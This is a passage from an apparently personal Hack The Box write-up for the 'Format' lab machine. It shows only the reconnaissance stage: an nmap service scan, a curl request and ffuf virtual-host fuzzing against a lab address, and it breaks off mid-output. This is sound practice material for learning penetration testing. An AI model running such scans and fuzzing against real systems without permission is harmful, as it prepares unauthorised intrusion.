<!doctype html>
<html class="no-js" lang="en" data-content_root="">
  <head><meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-2TCTE0JE23');
    </script>
        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Health" href="../health/health.html" /><link rel="prev" title="Forgot" href="../forgot/forgot.html" />

    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
        <title>Format - blnkn&#39;s notes</title>
      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
    
    


<style>
  body {
    --color-code-background: #f8f8f8;
  --color-code-foreground: black;
  
  }
  @media not print {
    body[data-theme="dark"] {
      --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
    }
    @media (prefers-color-scheme: dark) {
      body:not([data-theme="light"]) {
        --color-code-background: #202020;
  --color-code-foreground: #d0d0d0;
  
      }
    }
  }
</style></head>
  <body>
    
    <script>
      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
    </script>
    

<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
  <symbol id="svg-toc" viewBox="0 0 24 24">
    <title>Contents</title>
    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
    </svg>
  </symbol>
  <symbol id="svg-menu" viewBox="0 0 24 24">
    <title>Menu</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
      <line x1="3" y1="12" x2="21" y2="12"></line>
      <line x1="3" y1="6" x2="21" y2="6"></line>
      <line x1="3" y1="18" x2="21" y2="18"></line>
    </svg>
  </symbol>
  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
    <title>Expand</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
      <polyline points="9 18 15 12 9 6"></polyline>
    </svg>
  </symbol>
  <symbol id="svg-sun" viewBox="0 0 24 24">
    <title>Light mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
      <circle cx="12" cy="12" r="5"></circle>
      <line x1="12" y1="1" x2="12" y2="3"></line>
      <line x1="12" y1="21" x2="12" y2="23"></line>
      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
      <line x1="1" y1="12" x2="3" y2="12"></line>
      <line x1="21" y1="12" x2="23" y2="12"></line>
      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
    </svg>
  </symbol>
  <symbol id="svg-moon" viewBox="0 0 24 24">
    <title>Dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
    </svg>
  </symbol>
  <symbol id="svg-sun-half" viewBox="0 0 24 24">
    <title>Auto light/dark mode</title>
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
      <circle cx="12" cy="12" r="9" />
      <path d="M13 12h5" />
      <path d="M13 15h4" />
      <path d="M13 18h1" />
      <path d="M13 9h4" />
      <path d="M13 6h1" />
    </svg>
  </symbol>
</svg>

<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
<label class="overlay sidebar-overlay" for="__navigation">
  <div class="visually-hidden">Hide navigation sidebar</div>
</label>
<label class="overlay toc-overlay" for="__toc">
  <div class="visually-hidden">Hide table of contents sidebar</div>
</label>



<div class="page">
  <header class="mobile-header">
    <div class="header-left">
      <label class="nav-overlay-icon" for="__navigation">
        <div class="visually-hidden">Toggle site navigation sidebar</div>
        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
      </label>
    </div>
    <div class="header-center">
      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
    </div>
    <div class="header-right">
      <div class="theme-toggle-container theme-toggle-header">
        <button class="theme-toggle">
          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
        </button>
      </div>
      <label class="toc-overlay-icon toc-header-icon" for="__toc">
        <div class="visually-hidden">Toggle table of contents sidebar</div>
        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
      </label>
    </div>
  </header>
  <aside class="sidebar-drawer">
    <div class="sidebar-container">
      
      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
  
  <div class="sidebar-logo-container">
    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
  </div>
  
  <span class="sidebar-brand-text">blnkn's notes</span>
  
</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
  <input type="hidden" name="check_keywords" value="yes">
  <input type="hidden" name="area" value="default">
</form>
<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
</ul>
</li>
<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
</ul>
</li>
<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
<li class="toctree-l4"><a class="reference internal" href="../administrator/administrator.html">Administrator</a></li>
<li class="toctree-l4"><a class="reference internal" href="../ambassador/ambassador.html">Ambassador</a></li>
<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Format</a></li>
<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
<li class="toctree-l4"><a class="reference internal" href="../thefrizz/thefrizz.html">The Frizz</a></li>
<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
</ul>
</li>
<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/code/code.html">Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/dog/dog.html">Dog</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/escapetwo/escapetwo.html">Escape Two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
</ul>
</li>
<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
</ul>
</li>
</ul>

</div>
</div>

      </div>
      
    </div>
  </aside>
  <div class="main">
    <div class="content">
      <div class="article-container">
        <a href="#" class="back-to-top muted-link">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
          </svg>
          <span>Back to top</span>
        </a>
        <div class="content-icon-container">
          
<div class="theme-toggle-container theme-toggle-content">
            <button class="theme-toggle">
              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
            </button>
          </div>
          <label class="toc-overlay-icon toc-content-icon" for="__toc">
            <div class="visually-hidden">Toggle table of contents sidebar</div>
            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
          </label>
        </div>
        <article role="main">
          <p><img alt="format.png" src="../../../../_images/format.png" /></p>
<section id="format">
<h1>Format<a class="headerlink" href="#format" title="Permalink to this heading">#</a></h1>
<section id="enum">
<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="n">sV</span> <span class="mf">10.10.11.213</span> <span class="o">-</span><span class="n">oN</span> <span class="n">scans</span><span class="o">/</span><span class="n">nmap</span><span class="o">.</span><span class="n">initial</span>
<span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">16</span> <span class="mi">22</span><span class="p">:</span><span class="mi">20</span> <span class="n">IST</span>
<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.11.213</span>
<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.036</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">)</span>
<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.4</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">5</span><span class="o">+</span><span class="n">deb11u1</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
<span class="o">|</span>   <span class="mi">3072</span> <span class="n">c397ce837d255d5dedb545cdf20b054f</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="n">b3aa30352b997d20feb6758840a517c1</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">fab37d6e1abcd14b68edd6e8976727d7</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title (text/html).</span>
<span class="mi">3000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">microblog</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">3000</span><span class="o">/</span>
<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">13.36</span> <span class="n">seconds</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://10.10.11.213
&lt;!DOCTYPE<span class="w"> </span>html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta<span class="w"> </span>http-equiv<span class="o">=</span><span class="s2">&quot;Refresh&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;0; url=&#39;http://app.microblog.htb&#39;&quot;</span><span class="w"> </span>/&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></div>
</div>
<p><img alt="wap.png" src="../../../../_images/wap2.png" /><br />
<img alt="register.png" src="../../../../_images/register.png" /><br />
<img alt="zoinks.png" src="../../../../_images/zoinks.png" /></p>
<p>After registering we can create micro blogs which create vhosts on the box</p>
<p>Checking for vhosts, there’s a <code class="docutils literal notranslate"><span class="pre">sunny</span></code> subdomain</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">blnkn</span><span class="nd">@Kolossus</span><span class="p">](</span><span class="n">main</span> <span class="o">%=</span><span class="p">):</span><span class="o">~/</span><span class="n">blnknlights</span><span class="o">.</span><span class="n">github</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="nb">format</span><span class="o">%</span> <span class="n">ffuf</span> \
  <span class="o">-</span><span class="n">c</span> \
  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">110000.</span><span class="n">txt</span> \
  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://microblog.htb&quot;</span> \
  <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Host: FUZZ.microblog.htb&quot;</span> <span class="o">-</span><span class="n">mc</span> <span class="nb">all</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">153</span>

        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>

       <span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
<span class="n">________________________________________________</span>

 <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
